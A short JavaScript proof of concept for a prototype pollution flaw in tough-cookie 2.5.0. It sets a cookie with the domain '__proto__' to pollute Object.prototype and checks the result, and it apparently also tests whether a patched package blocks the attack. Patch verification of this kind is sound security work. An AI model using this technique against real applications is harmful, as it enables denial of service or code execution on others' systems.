// This file demonstrates an exploit for the Prototype Pollution vulnerability in tough-cookie 2.5.0.

/*
  Vulnerability Details:
   In tough-cookie 2.5.0, when creating a CookieJar with rejectPublicSuffixes=false,
   the internal store is built using objects that inherit from Object.prototype. This means
   that an attacker can set cookies with a domain like "__proto__" which pollutes the Object.prototype,
   causing every object in the application to inherit malicious properties. This can lead to
   denial-of-service or even remote code execution in certain contexts.

   Instructions:
     1. With vulnerable package:
        npm install tough-cookie@2.5.0 && node index.js
        Expected Output: "EXPLOITED SUCCESSFULLY"

     2. With patched package:
        npm install ./tough-cookie-2.5.0-PATCHED.tgz && node index.js
        Expected Output: "EXPLOIT FAILED"
*/

let tough = require('tough-cookie');

async function runExploit() {
  // Create a CookieJar with rejectPublicSuffixes set to false
  const jar = new tough.CookieJar(undefined, {rejectPublicSuffixes: false});

  // Exploit cookie: attempt to set a cookie whose domain is "__proto__"
  try {
    await jar.setCookie("malicious=exploit; Domain=__proto__; Path=/", "https://__proto__/dummy");
    // Now, in a vulnerable version, the Object.prototype would have been polluted.
    // For example, if we try to access any object property, it might be overridden.
    const obj = {};
    // If the exploit worked, obj.malicious would exist.
    if (obj.malicious === "exploit") {
      console.log("EXPLOITED SUCCESSFULLY");
    } else {
      console.log("EXPLOIT FAILED");
    }
  } catch (e) {
    console.error("Error during exploit attempt:", e);
    console.log("EXPLOIT FAILED");
  }
}

runExploit();
